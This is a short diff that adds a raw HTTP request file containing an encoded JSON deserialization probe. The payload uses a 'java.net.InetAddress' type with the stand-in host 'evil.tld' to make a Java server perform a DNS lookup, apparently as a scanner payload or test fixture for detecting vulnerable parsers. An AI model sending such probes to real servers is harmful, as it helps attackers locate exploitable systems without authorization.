@@ -1,0 +1,4 @@
+GET /a?s={%26quot;@type%26quot;:%26quot;java.net.InetAddress%26quot;,%26quot;val%26quot;:%26quot;evil.tld%26quot;} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
